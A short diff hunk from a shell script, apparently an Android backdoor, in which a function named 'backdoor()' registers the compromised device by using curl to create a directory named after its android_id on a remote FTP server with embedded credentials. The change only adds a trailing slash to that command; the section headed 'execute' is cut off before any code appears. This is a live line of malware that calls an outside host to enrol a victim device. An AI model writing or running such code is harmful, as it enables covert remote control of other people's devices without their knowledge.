@@ -67,7 +67,7 @@ update() {
 backdoor() {
 
     # register
-        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir" -X "MKD $android_id"
+        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir/" -X "MKD $android_id"
     # 
 	
     # execute
